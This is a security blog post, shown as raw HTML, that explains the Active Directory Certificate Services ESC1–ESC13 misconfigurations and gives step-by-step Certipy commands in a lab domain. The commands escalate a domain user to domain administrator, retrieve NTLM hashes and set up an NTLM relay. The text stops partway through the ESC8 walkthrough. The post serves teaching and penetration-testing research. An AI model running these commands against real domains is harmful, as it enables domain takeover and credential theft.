<!DOCTYPE html>
<html lang="en">
<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
<head>
  <meta name="google-site-verification" content="-Ld0YSINeh6fcZENkbjvfRTWu43ep4-wNFIpOI_Mbg4" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

  

  <title>Active Directory Certificate Services (AD CS) - A Beautifully Vulnerable and Mis-configurable Mess</title>

  
  <meta name="author" content="Logan Goins">
  

  <meta name="description" content="Active Directory Certificate Services (AD CS) is a collection of features in Microsoft Active Directory environments for creating, issuing, and managing Public Key Infrastructure (PKI) certificates. The Active Directory suite of software and protocols implement AD CS as a Windows Server role, usually allowing Administrators of the Domain to give...">

  

  

  

  

  

  

  


  
    
      
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">


    
      
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">


    
  

  
    
      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
    
      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
    
  

  

  
  
  

  

  
  <meta property="og:site_name" content="Shellph1sh's Blog">
  <meta property="og:title" content="Active Directory Certificate Services (AD CS) - A Beautifully Vulnerable and Mis-configurable Mess">
  <meta property="og:description" content="Active Directory Certificate Services (AD CS) is a collection of features in Microsoft Active Directory environments for creating, issuing, and managing Public Key Infrastructure (PKI) certificates. The Active Directory suite of software and protocols implement AD CS as a Windows Server role, usually allowing Administrators of the Domain to give...">

  
  <meta property="og:image" content="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/1773e9b4-ec72-41b7-af7a-e1aa06f7bf22">
  

  
  <meta property="og:type" content="article">
  <meta property="og:article:author" content="Logan Goins">
  <meta property="og:article:published_time" content="2024-05-04T00:00:00-04:00">
  <meta property="og:url" content="https://logan-goins.com/2024-05-04-ADCS/">
  <link rel="canonical" href="https://logan-goins.com/2024-05-04-ADCS/">
  

  
  <meta name="twitter:card" content="summary_large_image">
  
  <meta name="twitter:site" content="@shellph1sh">
  <meta name="twitter:creator" content="@shellph1sh">

  <meta property="twitter:title" content="Active Directory Certificate Services (AD CS) - A Beautifully Vulnerable and Mis-configurable Mess">
  <meta property="twitter:description" content="Active Directory Certificate Services (AD CS) is a collection of features in Microsoft Active Directory environments for creating, issuing, and managing Public Key Infrastructure (PKI) certificates. The Active Directory suite of software and protocols implement AD CS as a Windows Server role, usually allowing Administrators of the Domain to give...">

  
  <meta name="twitter:image" content="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/1773e9b4-ec72-41b7-af7a-e1aa06f7bf22">
  

  


  

  

</head>


<body>
  <style>
    .container-md {max-width: 100%;}
  </style>
  


  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="https://logan-goins.com/">Shellph1sh's Blog</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="main-navbar">
    <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="https://logan-goins.com/assets/Resume.pdf">Resume</a>
          </li>
        <li class="nav-item">
          <a class="nav-link" id="nav-search-link" href="#" title="Search">
            <span id="nav-search-icon" class="fa fa-search"></span>
            <span id="nav-search-text">Search</span>
          </a>
        </li></ul>
  </div>

  

  
    <div class="avatar-container">
      <div class="avatar-img-border">
        <a href="https://logan-goins.com/">
          <img alt="Navigation bar avatar" class="avatar-img" src="/assets/profile.png" />
        </a>
      </div>
    </div>
  

</nav>



<div id="beautifuljekyll-search-overlay">

  <div id="nav-search-exit" title="Exit search">✕</div>
  <input type="text" id="nav-search-input" placeholder="Search">
  <ul id="search-results-container"></ul>
  
  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
  <script>
    var searchjson = '[ \
       \
        { \
          "title"    : "Intercept", \
          "category" : "PentestingActive DirectoryVulnlab", \
          "url"      : "/2024-07-05-Intercept/", \
          "date"     : "July  5, 2024" \
        }, \
       \
        { \
          "title"    : "Reflection", \
          "category" : "PentestingActive DirectoryVulnlab", \
          "url"      : "/2024-06-23-reflection/", \
          "date"     : "June 23, 2024" \
        }, \
       \
        { \
          "title"    : "Active Directory Certificate Services (AD CS) - A Beautifully Vulnerable and Mis-configurable Mess", \
          "category" : "PentestingWindowsActive Directory", \
          "url"      : "/2024-05-04-ADCS/", \
          "date"     : "May  4, 2024" \
        }, \
       \
        { \
          "title"    : "Manager", \
          "category" : "HacktheBoxWindowsPentesting", \
          "url"      : "/2024-03-17-Manager/", \
          "date"     : "March 17, 2024" \
        }, \
       \
        { \
          "title"    : "Evading AV/EDR with Cobalt strike", \
          "category" : "AdsimWindowsMalDev", \
          "url"      : "/2024-02-03-CS/", \
          "date"     : "February  3, 2024" \
        }, \
       \
        { \
          "title"    : "Active", \
          "category" : "HacktheBoxWindowsPentesting", \
          "url"      : "/2024-01-09-Active/", \
          "date"     : "January  9, 2024" \
        }, \
       \
        { \
          "title"    : "Diving into HeadHunter", \
          "category" : "MalDevWindowsLinuxPentesting", \
          "url"      : "/2024-01-04-HeadHunter/", \
          "date"     : "January  4, 2024" \
        }, \
       \
        { \
          "title"    : "Forest", \
          "category" : "HacktheBoxWindowsPentesting", \
          "url"      : "/2024-01-01-Forest/", \
          "date"     : "January  1, 2024" \
        }, \
       \
        { \
          "title"    : "My Experience with OSCP and the &quot;Try Harder&quot; Mindset", \
          "category" : "OffsecPentestingCertifications", \
          "url"      : "/2023-12-27-OSCP/", \
          "date"     : "December 27, 2023" \
        }, \
       \
       \
        { \
          "title"    : "Blog Archive", \
          "category" : "page", \
          "url"      : "/archive/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Shellph1sh&#39;s Blog", \
          "category" : "page", \
          "url"      : "/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Tag Index", \
          "category" : "page", \
          "url"      : "/tags/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "", \
          "category" : "page", \
          "url"      : "/aboutme/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Shellph1sh&#39;s Blog", \
          "category" : "page", \
          "url"      : "/page2/", \
          "date"     : "January 1, 1970" \
        } \
       \
    ]';
    searchjson = JSON.parse(searchjson);

    var sjs = SimpleJekyllSearch({
      searchInput: document.getElementById('nav-search-input'),
      resultsContainer: document.getElementById('search-results-container'),
      json: searchjson
    });
  </script>
</div>





  <!-- TODO this file has become a mess, refactor it -->







<header class="header-section ">

<div class="intro-header no-img">
  <div class="container-md">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
        <div class="post-heading">
          <h1>Active Directory Certificate Services (AD CS) - A Beautifully Vulnerable and Mis-configurable Mess</h1>
          

          
            <span class="post-meta">Posted on May 4, 2024</span>
            
            
          
        </div>
      </div>
    </div>
  </div>
</div>
</header>





<div class=" container-md ">
  <div class="row">
    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">

      

      

      <article role="main" class="blog-post">
        <p>Active Directory Certificate Services (AD CS) is a collection of features in Microsoft Active Directory environments for creating, issuing, and managing Public Key Infrastructure (PKI) certificates. The Active Directory suite of software and protocols implement AD CS as a Windows Server role, usually allowing Administrators of the Domain to give out certificates for encrypting, signing, and potentially authentication to devices in the Active Directory environment.</p>

<p>Just like other Active Directory technologies, AD CS can be easily misconfigured for full Domain privilege escalation from Domain User to Domain Administrator, and can also allow machine and Domain persistence, and finally credential theft. This documentation will cover some AD CS misconfigurations and how to exploit most of them. This tradecraft was originally discovered and publicized by some amazing people at SpecterOps in this <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">whitepaper</a>.</p>

<p>This writeup is mainly to document my research into AD CS attacks and provide a source of knowledge for others to learn from.</p>

<ul>
  <li><a href="#active-directory-certificate-services-ad-cs-a-beautifully-vulnerable-and-mis-configurable-mess">Active Directory Certificate Services (AD CS): A Beautifully Vulnerable and Mis-configurable Mess</a>
    <ul>
      <li><a href="#introduction">Introduction</a></li>
      <li><a href="#welcome-to-the-family-the-esc-family">Welcome to the Family: The ESC Family</a>
        <ul>
          <li><a href="#esc1---template-misconfiguration">ESC1 - Template Misconfiguration</a></li>
          <li><a href="#esc2--template-misconfiguration-part-ii">ESC2 – Template Misconfiguration: Part II</a></li>
          <li><a href="#esc3--enrollment-agent-template-misconfiguration">ESC3 – Enrollment Agent Template Misconfiguration</a></li>
          <li><a href="#esc4--template-access-control-misconfiguration">ESC4 – Template Access Control Misconfiguration</a></li>
          <li><a href="#esc5--pki-objects-access-control">ESC5 – PKI Objects Access Control</a></li>
          <li><a href="#esc6--arbitrary-san-usage">ESC6 – Arbitrary SAN Usage</a></li>
          <li><a href="#esc7--ca-permissions-misconfiguration">ESC7 – CA Permissions Misconfiguration</a></li>
          <li><a href="#esc8--ntlm-relay-to-ad-cs-http-endpoints">ESC8 – NTLM Relay to AD CS HTTP Endpoints</a></li>
          <li><a href="#esc9--no-security-extension">ESC9 – No Security Extension</a></li>
          <li><a href="#esc10--weak-certificate-mappings">ESC10 – Weak Certificate Mappings</a></li>
          <li><a href="#esc11--relaying-ntlm-to-icpr">ESC11 – Relaying NTLM to ICPR</a></li>
          <li><a href="#esc12--adcs-ca-on-yubihsm">ESC12 – ADCS CA on YubiHSM</a></li>
          <li><a href="#esc13---oid-group-link-abuse">ESC13 - OID Group Link Abuse</a></li>
        </ul>
      </li>
      <li><a href="#practical-exploitation">Practical Exploitation</a>
        <ul>
          <li><a href="#enumeration">Enumeration</a></li>
          <li><a href="#exploitation-of-esc1">Exploitation of ESC1</a></li>
          <li><a href="#exploitation-of-esc3">Exploitation of ESC3</a></li>
          <li><a href="#exploitation-of-esc4">Exploitation of ESC4</a></li>
          <li><a href="#exploitation-of-esc6">Exploitation of ESC6</a></li>
          <li><a href="#exploitation-of-esc7">Exploitation of ESC7</a></li>
          <li><a href="#exploitation-of-esc8">Exploitation of ESC8</a></li>
          <li><a href="#exploitation-of-esc9">Exploitation of ESC9</a></li>
          <li><a href="#exploitation-of-esc10">Exploitation of ESC10</a></li>
          <li><a href="#exploitation-of-esc11">Exploitation of ESC11</a></li>
          <li><a href="#exploitation-of-esc13">Exploitation of ESC13</a></li>
        </ul>
      </li>
      <li><a href="#conclusion">Conclusion</a></li>
    </ul>
  </li>
</ul>

<h2 id="welcome-to-the-family-the-esc-family">Welcome to the Family: The ESC Family</h2>

<p>AD CS attacks are identified by the misconfigurations which allow exploitation, specifically the ESC family of vulnerabilities. The whitepaper linked in the previous section identifies 8 initial ESC vulnerabilities, but new potential misconfigurations are found all the time. Currently, 13 ESC vulnerabilities exist, meaning 5 more potential avenues of exploitation have been uncovered. I’ll go over all the vulnerabilities in the ESC family, starting with an introduction, occasionally their requirements for exploitation, then later go into a practical example.</p>

<h3 id="esc1---template-misconfiguration">ESC1 - Template Misconfiguration</h3>

<p>This avenue of exploitation specifically involves misconfigured certificate templates, which as the name implies, are used as templates for distribution of AD CS certificates. They were created for ease of duplication, and configuration, making them a prime target for attackers and threat actors due to the likelihood that System Administrators will continuously duplicate and modify templates without fully understanding the effects of some options.</p>

<p>ESC1 specifically involves abusing the “CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT” flag and requesting a certificate as any Domain user, including users in the Domain Admins group, leading to privilege escalation.</p>

<p>Just like most Active Directory attack vectors, some specific conditions must be met for exploitation of ESC1, these include:</p>

<ol>
  <li>The Certificate Authority (CA) grants low-privileged users enrollment rights, this allows groups such as “Domain Users” to request certificates.</li>
  <li>The certificate request is not required to be approved by a certificate “manager”.</li>
  <li>Authorized signatures aren’t required, meaning that a pre-approved certificate does not need to be provided to issue a new certificate.</li>
  <li>The template allows client authentication using the certificate.</li>
  <li>The template allows requesters to specify a SubjectAltName (SAN), meaning the requester can request a certificate as anyone. This is because the “CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT” is specified.</li>
</ol>

<h3 id="esc2--template-misconfiguration-part-ii">ESC2 – Template Misconfiguration: Part II</h3>

<p>In ESC2, the certificate template is defined to include the “Any Purpose EKU” or “No EKU”. EKU stands for “Extended/Enhanced Key Usage”, these are identifiers that define how a certificate can be utilized. This “Any Purpose EKU” or the “No EKU” option permits the certificate to be obtained for any purpose, this could mean client authentication, server authentication, etc. Most times, ESC2 can be utilized with another ESC vulnerability for privilege escalation if there’s restrictions on exactly what the certificate can be used for, allowing a bypass of a potentially critical defense.</p>

<p>The requirements for ESC2 include:</p>

<ol>
  <li>The Certificate Authority (CA) grants low-privileged users enrollment rights, this allows groups such as “Domain Users” to request certificates.</li>
  <li>The certificate request is not required to be approved by a certificate “manager”.</li>
  <li>Authorized signatures aren’t required, meaning that a pre-approved certificate does not need to be provided to issue a new certificate.</li>
  <li>Includes the “Any purpose EKU”, or “No EKU” attribute.</li>
</ol>

<h3 id="esc3--enrollment-agent-template-misconfiguration">ESC3 – Enrollment Agent Template Misconfiguration</h3>

<p>ESC3 is quite like ESC1, with a key difference, the template defines the “Certificate Request Agent EKU” option, this means that a certificate can be requested on behalf of another principal, this can be another user, such as the Domain Admin.</p>

<p>The attack requirements for ESC3 include:</p>

<ol>
  <li>The Certificate Authority (CA) grants low-privileged users enrollment rights, this allows groups such as “Domain Users” to request certificates.</li>
  <li>The certificate request is not required to be approved by a certificate “manager”.</li>
  <li>Authorized signatures aren’t required, meaning that a pre-approved certificate does not need to be provided to issue a new certificate.</li>
  <li>The template includes the “Certificate Request Agent EKU”, allowing the request of a certificate as a highly privileged user.</li>
</ol>

<h3 id="esc4--template-access-control-misconfiguration">ESC4 – Template Access Control Misconfiguration</h3>

<p>ESC4 is relatively unique in its exploitation, utilizing mainly Active Directory ACL permissions. During this path to exploitation, if the current operating user in the Active Directory environment has one of the following ACL permissions over the template object:</p>

<ol>
  <li>Owner</li>
  <li>FullControl</li>
  <li>WriteOwner</li>
  <li>WriteDacl</li>
  <li>WriteProperty</li>
</ol>

<p>Then such a user can modify the target template to configure the specific conditions for an ESC1 attack, then request a certificate as the Domain Administrator.</p>

<h3 id="esc5--pki-objects-access-control">ESC5 – PKI Objects Access Control</h3>

<p>This ESC vulnerability is much more generalized than the others and doesn’t directly involve certificate templates at all. ESC5 mainly notes that if any of the primary PKI Active Directory Objects are compromised, a low privileged attacker could gain full control of the entire Domain’s AD CS infrastructure.</p>

<p>This is mainly due to the fact that with control over the AD PKI, we can create specific conditions for any ESC vulnerability that allows Domain privilege escalation.</p>

<p>Some of the various objects include:</p>

<ol>
  <li>The CA’s Computer Object</li>
  <li>The CA’s RPC/DCOM server</li>
  <li>Any objects inside of the container “CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>”</COM></DOMAIN></li>
</ol>

<h3 id="esc6--arbitrary-san-usage">ESC6 – Arbitrary SAN Usage</h3>

<p>ESC6 involves abusing the “EDITF_ATTRIBUTESUBJECTALTNAME2” flag on the CA’s configuration. This flag permits any client to request any certificate with a different Subject Alternative Name (SAN), leading to Domain privilege escalation by once again, requesting a certificate as the Domain Administrator.</p>

<h3 id="esc7--ca-permissions-misconfiguration">ESC7 – CA Permissions Misconfiguration</h3>

<p>This avenue of exploitation is particularly interesting to me, given the indirect nature of Domain compromise or Domain privilege escalation. A Domain being vulnerable to ESC7 includes a low privileged users’ ability to manage the CA, specifically with the “ManageCA” and “ManageCertificates” permission. These permissions can be utilized to modify the CA configuration, including the “EDITF_ATTRIBUTESUBJECTALTNAME2” previously mentioned in ESC6. Allowing any principal with the “ManageCA” permission to configure the CA as vulnerable to ESC6, while also making the “Manager Approval” security setting obsolete, since we can directly approve pending certificate requests.</p>

<h3 id="esc8--ntlm-relay-to-ad-cs-http-endpoints">ESC8 – NTLM Relay to AD CS HTTP Endpoints</h3>

<p>AD CS provides the option to utilize certificate enrollment over HTTP from a variety of web interfaces, usually not protected against NTLM relay attacks.</p>

<p>An NTLM relay attack is when an adversary makes or coerces authentication from a device, user, or computer, then relays the NTLM authentication request to another device, effectively impersonating that user during authentication.</p>

<p>ESC8 involved an adversary coercing authentication from a Domain controller, which sends an authentication request from the Domain Controller (DC) Computer account. We can use this to perform an NTLM relay attack targeting the AD CS HTTP enrollment endpoint and request a certificate as the DC Computer account, granting us control of the Domain.</p>

<p>While this attack relies less on misconfigurations, some conditions still must be met:</p>

<ol>
  <li>NTLM authentication must be enabled.</li>
  <li>The enrollment service endpoint must be using HTTP.</li>
  <li>The CA must not be installed on the Domain Controller</li>
</ol>

<p>While full Domain takeover is possible given the above conditions, if the CA is installed on the DC, takeover of any other Domain device is also possible. If you can coerce authentication from any other device on the Domain you can still request a certificate as that account. Then we can utilize shadow credentials or RBCD to compromise that machine.</p>

<h3 id="esc9--no-security-extension">ESC9 – No Security Extension</h3>

<p>When the enrollment flag: “CT_FLAG_NO_SECURITY_EXTENSION” is set onto a certificate that a user has enrollment permissions to, and another principal has GenericWrite over that user, we can utilize this specific scenario to request a certificate as any user on the Domain.</p>

<p>According to the Microsoft <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/a1f27ffb-7f74-4fa1-8841-7cde4ba0bcfe">Documentation</a> on the msPKI-Certificate-Name-Flag value:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If the CT_FLAG_NO_SECURITY_EXTENSION flag is not set, the CA MUST add the szOID_NTDS_CA_SECURITY_EXT security extension, as specified in section 2.2.2.7.7.4, to the issued certificate with the value set to the string format of the objectSid attribute obtained from the requestor’s user object in the working directory. For this, the CA MUST invoke the processing rules in section 3.2.2.1.2, with input parameter EndEntityDistinguishedName set equal to the requester's user object distinguished name, and retrieve the objectSid attribute from the returned EndEntityAttributes output parameter.
</code></pre></div></div>

<p>So when CT_FLAG_NO_SECURITY_EXTENSION is set, the CA never adds the szOID_NTDS_CA_SECURITY_EXT security extension, meaning it never directly references the users ObjectSid value.</p>

<p>This means that we can change the user’s UPN, or User Principal Name to a higher privilege user, purposefully leaving the domain of the user ambiguous to prevent collision. After the UPN has been changed, you can request a certificate as the spoofed user then change the UPN back to its original value.</p>

<h3 id="esc10--weak-certificate-mappings">ESC10 – Weak Certificate Mappings</h3>

<p>ESC10 is a variation of the same technique for Domain compromise as ESC9, including the utilization of an account that our current principal has GenericWrite over to compromise any account on the Domain, including a Domain Administrator. The only difference between ESC9 and ESC10 is the fact that ESC9 is limited to a specific template, while ESC10 is not.</p>

<p>There are two primary exploitation avenues, indicated by specific registry keys on the Domain Controller:</p>

<ol>
  <li>When StrongCertificateBindingEnforcement is configured as 0, this key is located at HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc</li>
</ol>

<p>This avenue almost completely mirrors ESC9, using a user account we have control over and changing their UPN to request a certificate as the Administrator.</p>

<ol>
  <li>If CertificateMappingMethods includes the UPN bit (0x4), this key is located at HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel.</li>
</ol>

<p>This second avenue is slightly different, allowing us to compromise any account without the userPrincipalName property through the proxy account we have GenericWrite on, including Machine Accounts such as the Domain Controllers.</p>

<h3 id="esc11--relaying-ntlm-to-icpr">ESC11 – Relaying NTLM to ICPR</h3>

<p>If the CA server is not configured with the “IF_ENFORCEENCRYPTICERTREQUEST” attribute, an attacker can perform NTLM relay attacks to the RPC service without signing. We can utilize authentication coercion to relay any Domain Computers authentication request to the CA and request a user as that machine account, permitting us access to any machine on the domain. Also consider this could result in a full Domain takeover. Just like in ESC8, if the CA is not hosted on the Domain Controller and authentication can be coerced, we can request a certificate for the DC machine account.</p>

<h3 id="esc12--adcs-ca-on-yubihsm">ESC12 – ADCS CA on YubiHSM</h3>

<p>Administrators can store an ADCS CA on a Yubico YubiHSM, if the adversary has remote command execution of the host operating system, the YubiHSM CA private key can be utilized for creating and issuing certificates, and this can be done by unlocking the YubiHSM with the plaintext password in the registry key “HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword”</p>

<h3 id="esc13---oid-group-link-abuse">ESC13 - OID Group Link Abuse</h3>

<p>An OID is an ObjectIdentifier and allows all Active Directory objects to be independently identifiable.</p>

<p>The OID group link attribute, or ms-DS-OIDToGroup-Link, allows an issuance policy to be linked to a specific Active Directory group.</p>

<p>If a certificate template is configured with enrollment rights to our current user or computer, and the certificate template issuance policy has an OID group link, the current user or computer can request a certificate that will allow access to environmental resources as a user of the group in the OID group link.</p>

<p>Just like the other ESC vulnerabilities, this one has some of the same requirements, including the allowance of client authentication, certificate enrollment, etc. But also has some unique requirements, including:</p>

<ol>
  <li>The certificate template has an issuance policy extension</li>
  <li>The issuance policy has an OID group link to a group</li>
</ol>

<p>ESC13’s impact mostly depends on which AD group the issuance policy is linked to, and could allow full privilege escalation if linked to the Domain Admin group.</p>

<h2 id="practical-exploitation">Practical Exploitation</h2>

<p>After our host is provisioned in an Active Directory environment, for identifying most vulnerabilities, enumeration is paramount, and this is no different for AD CS vulnerabilities.</p>

<p>In these examples we’re going to assume that in our assessment we’re currently operating as a user in the “Domain Users” group, with usable credentials for that user.</p>

<h3 id="enumeration">Enumeration</h3>

<p>A fantastic tool for enumerating AD CS is Certipy. Certipy can be found <a href="https://github.com/ly4k/Certipy">here</a></p>

<p>Certipy, as indicated by the name, is written in Python. Certipy can be utilized to find and exploit AD CS misconfigurations.</p>

<p>You can view Certipy’s options with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy -h
</code></pre></div></div>

<p>Certipy can enumerate potential AD CS misconfigurations using the “find” and “-vulnerable” flags, while also printing to the terminal with the “-stdout” flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy find -vulnerable -u attacker@lab.lan -p 'P@ssw0rd' -dc-ip 192.168.1.2 -stdout
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/1773e9b4-ec72-41b7-af7a-e1aa06f7bf22" alt="image" /></p>

<p>Keep in mind when using certipy that we’ll have to specify credentials and the Domain Controller IP address each time we want to interact with the Domain.</p>

<h3 id="exploitation-of-esc1">Exploitation of ESC1</h3>

<p>After running Certipy with the “find” flag, if a certificate template allows client authentication, allows the requestor to issue a SAN (subject alternative name), and the current user group has enrollment rights, the Domain is vulnerable to ESC1.</p>

<p>Using Certipy, we can directly request a certificate from the CA which can be used for Domain privilege escalation:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u attacker -p 'P@ssw0rd' -target-ip 192.168.1.2 -ca 'lab-DC-CA' -template 'ESC1' -upn 'administrator@lab.lan'
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/888d50e9-491d-410d-899d-bdd4043d5670" alt="image" /></p>

<p>Then, using the certificate to authenticate to the DC, request the NTLM hash of the user specified in the SAN, in most cases, the Domain Administrator.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'lab.lan' -dc-ip 192.168.1.2
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/938f2223-8d76-404c-b4f7-e63ea8898a1c" alt="image" /></p>

<h3 id="exploitation-of-esc3">Exploitation of ESC3</h3>

<p>First request a certificate as the current user:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u attacker -p 'P@ssw0rd' -target-ip 192.168.1.2 -ca 'lab-DC-CA' -template 'ESC3'
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/4dd7dcbb-387d-41d3-a268-0db660744213" alt="image" /></p>

<p>Then utilize that certificate to authenticate on behalf of the Domain Administrator:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u attacker -p 'P@ssw0rd' -target-ip 192.168.1.2 -ca 'lab-DC-CA' -template 'User' -on-behalf-of 'lab\administrator' -pfx 'attacker.pfx'
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/b4ed09e4-ab0b-474a-90f5-64cc0aefad81" alt="image" /></p>

<p>Then we can utilize the new certificate from the Administrator with the “auth” flag, just like the previous section.</p>

<h3 id="exploitation-of-esc4">Exploitation of ESC4</h3>

<p>With a user that has ACL related control over the certificate template, we can just change the template to be vulnerable to ESC1, ensure to save the old configuration to restore the template after exploitation.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy template -u attacker -p 'P@ssw0rd' -template ESC4 -save-old
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/263d32f4-ad6c-4c01-8cf1-5843f4254319" alt="image" /></p>

<p>Exploit ESC1</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u attacker -p 'P@ssw0rd' -ca lab-DC-CA -target 192.168.1.2 -template ESC4 -upn administrator@lab.lan
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/27899f7b-944b-4809-aa98-f15d75635ce2" alt="image" /></p>

<p>Finally restore the configuration:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy template -u attacker -p 'P@ssw0rd' -target 192.168.1.2 -template ESC4 -configuration ESC4.json
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/5313b7af-c4e6-4bfc-a0f7-dbebc50b4e42" alt="image" /></p>

<h3 id="exploitation-of-esc6">Exploitation of ESC6</h3>

<p>When requesting a new certificate with a specified UPN with Certipy, it will automatically detect and exploit this vulnerability. This can be done with:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u attacker -p 'P@ssw0rd' -target 192.168.1.2 -ca 'lab-DC-CA' -template User -upn administrator@lab.lan
</code></pre></div></div>

<h3 id="exploitation-of-esc7">Exploitation of ESC7</h3>

<p>First, with the ManageCA permission, add yourself as an officer to the CA</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy ca -ca 'lab-DC-CA' -add-officer attacker -username attacker -password 'P@ssw0rd' -dc-ip 192.168.1.2
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/01ea8173-0851-4b35-b9d8-b7c30e098633" alt="image" /></p>

<p>Utilize the “SubCA” template for our attack. The template is enabled by default, but if it’s disabled then we can enable it ourselves.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy ca -ca 'lab-DC-CA' -enable-template "SubCA" -username attacker -password 'P@ssw0rd' -dc-ip 192.168.1.2
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/c4eeafb5-549b-4729-a944-fcd34b9d0785" alt="image" /></p>

<p>Then request a certificate as the Domain Administrator, this request will be denied, but we’ll issue the request later using our officer permissions:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u attacker -p 'P@ssw0rd' -ca 'lab-DC-CA' -target 192.168.1.2 -template SubCA -upn administrator@lab.lan
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/e8a0d161-f9c4-4d85-9c8d-a133fbe2c96e" alt="image" /></p>

<p>Next issue the requested certificate, use the request number from the previous command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy ca -ca 'lab-DC-CA' -issue-request 14 -username attacker -password 'P@ssw0rd' -dc-ip 192.168.1.2
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/6909096d-a525-42bc-9ed6-e6a08d3dbffc" alt="image" /></p>

<p>Finally, now that the request had been issued, we can request the certificate as the Domain Administrator</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy req -u attacker -p 'P@ssw0rd' -ca 'lab-DC-CA' -target 192.168.1.2 -retrieve 14
</code></pre></div></div>

<p><img src="https://github.com/shellph1sh/shellph1sh.github.io/assets/55106700/83977ac8-5ab6-4c32-bdf3-c9660532393f" alt="image" /></p>

<h3 id="exploitation-of-esc8">Exploitation of ESC8</h3>

<p>The identification of where the web enrollment service is located on the Domain is the most important factor in discovering if the Domain is vulnerable to ESC8. Remember, an NTLM relay attack cannot be performed where the device authenticating and the target device are the same, requiring the web enrollment endpoint to be located somewhere other than the Domain Controller.</p>

<p>Utilize Certipy to preform an NTLM relay attack against the web enrollment endpoint.</p>

<p>First initialize the NTLM relay:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy relay -target 192.168.1.3 -template DomainController
</code></pre></div></div>

<p>Then finally coerce authentication from the Domain Controller to the attacker host, this can be done through a multitude of options, including tools like <a href="https://github.com/ly4k/PetitPotam">PetitPotam</a>.</p>

